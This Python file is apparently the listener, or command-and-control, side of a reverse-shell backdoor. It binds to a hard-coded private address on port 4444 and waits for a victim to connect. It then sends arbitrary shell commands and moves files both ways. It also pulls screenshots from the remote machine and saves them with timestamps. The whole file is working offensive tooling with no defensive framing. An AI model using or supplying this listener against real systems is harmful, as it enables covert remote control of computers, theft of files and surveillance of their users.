import socket
import json
import base64
import datetime


class Listener:
    def __init__(self, host, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((host, port))
        self.listener.listen(0)
        print("[+] Waiting for incoming connections........")
        self.connection, adress = self.listener.accept()
        print("[+] Got a connection from " + str(adress))

    def reliable_send(self, data):
        if len(data) == 3 and data[0] == "upload":
            data[2] = data[2].decode("utf-8")
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    @staticmethod
    def write_file(path, data):
        with open(path, "wb") as file:
            file.write(base64.b64decode(data))
            return "[+] Download successful"

    @staticmethod
    def read_file(path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ").split(" ")
            try:
                if command[0] == "upload":
                    file_data = self.read_file(command[1])
                    command.append(file_data)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
                elif command[0] == "screen" and "[-] Error" not in result:
                    result = self.write_file(f"screenshot_{str(datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S'))}.png",
                                             result)
            except Exception:
                result = "[-] Error with using command! Check correct!"
            print(result)


def main():
    listener = Listener("192.168.142.137", 4444)
    listener.run()


if __name__ == '__main__':
    main()
